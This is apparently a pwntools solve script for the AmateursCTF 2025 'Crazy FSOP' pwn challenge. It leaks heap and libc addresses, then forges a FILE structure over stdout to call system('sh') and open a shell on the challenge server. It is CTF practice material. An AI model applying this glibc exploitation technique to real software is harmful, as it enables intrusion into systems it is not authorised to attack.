#!/usr/bin/env python3

from pwn import *

PATH = "/home/kali/CTFs/Events/AmateursCTF-2025/pwn/Crazy FSOP/chal"
LIBC_PATH = "/home/kali/CTFs/Events/AmateursCTF-2025/pwn/Crazy FSOP/libc.so.6"
LD_PATH = "/home/kali/CTFs/Events/AmateursCTF-2025/pwn/Crazy FSOP/ld-2.42.so"

exe = context.binary = ELF(PATH, checksec=False)
libc = ELF(LIBC_PATH, checksec=False)
ldd = ELF(LD_PATH, checksec=False)

def create(p: process, idx: int, size: int, data: bytes):
    p.sendlineafter(b"which operation: ", b"1")
    p.sendlineafter(b"which note: ", str(idx).encode())
    p.sendlineafter(b"size: ", str(size).encode())
    p.sendlineafter(b"data: ", data)

def delete(p: process, idx: int):
    p.sendlineafter(b"which operation: ", b"2")
    p.sendlineafter(b"which note: ", str(idx).encode())

def show(p: process, idx: int):
    p.sendlineafter(b"which operation: ", b"3")
    p.sendlineafter(b"which note: ", str(idx).encode())
    p.recvuntil(b'data: ')
    p.recvline(keepends=False)
    return p.recvline(keepends=False)

def demangle(addr: int) -> int:
    result = addr ^ (addr >> 12)
    result = addr ^ (result >> 12)
    result = addr ^ (result >> 12)

    return result

if args.REMOTE:
    HOST = "amt.rs"
    PORT = 26797
    p = remote(HOST, PORT)
else:
    p = process(PATH)
    if args.GDB:
        GDB_SCRIPT = \
"""
b *main + 333
b *main + 443
b *main + 520
b *main + 118
# b *__vfprintf_internal
b *_IO_wfile_overflow
b *_IO_wdoallocbuf
c
"""
        # gdb.attach(p, gdbscript=GDB_SCRIPT)

# Leaking heap
for i in range(2):
    create(p, i, 0x500, b'C' * 0x00)
    create(p, 15, 0x10, b'A' * 0x10)    # Guard

for i in range(2):
    delete(p, i)

create(p, 1, 0x500, b'C' * 0x07)

heap_base = u64(show(p, 1).ljust(8, b'\x00')) - 0x25c0
print(f'heap_base: {hex(heap_base)}')

# Leaking LIBC
create(p, 0, 0x500, b'C' * 0x00)
libc.address = (u64(show(p, 0).ljust(8, b'\x00')) << 8) - 0x234b00
print(f"libc.address: {hex(libc.address)}")

# Performing FSOP
stdout_idx = -4
fs_addr = heap_base + 0x3880
w_addr = fs_addr + 0xE0
w_vtable_addr = w_addr

w_offset = 0xE0
fs = flat(
    {
        0x00: b' sh'.ljust(8, b'\x00'),
        0xA0: p64(w_addr),
        0xC0: p32(-1, sign="signed"),
        0xD8: libc.sym['_IO_wfile_jumps'] - 0x38 + 0x18,
        w_offset+0xE0: p64(w_vtable_addr),
        w_offset+0x68: p64(libc.sym['system'])
    },
    filler=b'\x00'
)

if args.GDB:
    gdb.attach(p, gdbscript=GDB_SCRIPT)

create(p, stdout_idx, 0x400, fs)

p.interactive()